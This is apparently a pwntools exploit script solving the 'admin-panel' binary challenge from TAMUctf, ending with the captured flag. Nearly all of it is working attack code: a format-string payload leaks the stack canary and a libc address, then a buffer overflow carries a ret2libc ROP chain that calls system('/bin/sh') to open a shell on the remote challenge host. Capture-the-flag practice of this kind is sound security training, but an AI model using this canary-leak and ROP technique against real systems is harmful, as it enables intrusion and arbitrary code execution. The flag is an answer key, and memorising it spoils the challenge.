#!/usr/bin/python3

from pwn import *

exe = ELF('admin-panel_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x13FB 

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
else:
    p = process(exe.path)

GDB()
pa = b'secretpass123'.ljust(32, b'a') + b'%15$p|%17$p|'
sla(b'16:', b'admin')
sla(b'24:', pa)
p.recvuntil(b'admin\n')
canary = int(p.recvuntil(b'|', drop=True), 16)
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x2409b
info("canary " + hex(canary))
info("libc.address " + hex(libc.address))
sla(b'3:', b'2')
rop = ROP(libc)
pa = b'a'.ljust(72, b'a') + flat(canary, 0, rop.find_gadget(['pop rdi', 'ret']).address + 1, rop.find_gadget(
    ['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')), libc.sym.system)
sla(b'wrong:', pa)
p.interactive()
# gigem{l3ak1ng_4ddre55e5_t0_byp4ss_s3cur1t1e5!!}